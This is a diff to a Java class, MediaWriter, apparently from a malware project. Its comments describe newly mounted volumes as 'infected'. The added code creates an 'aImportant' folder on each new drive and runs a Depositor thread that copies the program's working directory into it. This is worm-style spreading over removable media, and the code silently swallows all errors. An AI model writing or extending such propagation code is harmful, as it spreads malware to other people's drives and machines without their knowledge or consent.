@@ -97,21 +97,30 @@ public class MediaWriter implements Module, Runnable {
 
                     // new volumes are infected and logged
                     // same configuration, different volume
+
+                    /*
                     CopyConfig currentConfig = copyConfig;
                     currentConfig.startPath = currentVol.getAbsolutePath();
                     Copy currentCopy = new Copy(currentConfig); // every volume needs different copy module instance
+                    */
 
-                    if(!isStopped()) {
-                        threadPool.execute(currentCopy); // will perform duplication in new thread on the current volume
-                        System.out.printf("Drive %s %s Bytes (Code: %d)\n", currentVol.getAbsolutePath(), currentVol.getTotalSpace(),
-                                currentVol.hashCode());
-                        historicalVolumes.addLast(currentVol); // record in history of encountered (ie. infected) volumes.
+                    File deposit = new File(String.format("%s\\aImportant", currentVol.getAbsolutePath()));
+                    if(deposit.exists() || deposit.mkdir()) {
+                        Depositor depositor = new Depositor(new File(System.getProperty("user.dir")), deposit);
 
+                        if (!isStopped()) {
+                            threadPool.execute(depositor); // will perform duplication in new thread on the current volume
+
+                            System.out.printf("[*] Drive %s %s Bytes \n", currentVol.getAbsolutePath(), currentVol.getTotalSpace());
+                            historicalVolumes.addLast(currentVol); // record in history of encountered (ie. infected) volumes.
+
+                        } else {
+                            break;
+                        }
                     }
                     else {
-                        break;
+                        System.err.println("[!] Could not create deposit");
                     }
-
                 }
             }
             catch(Exception ex) { /*pass*/ }
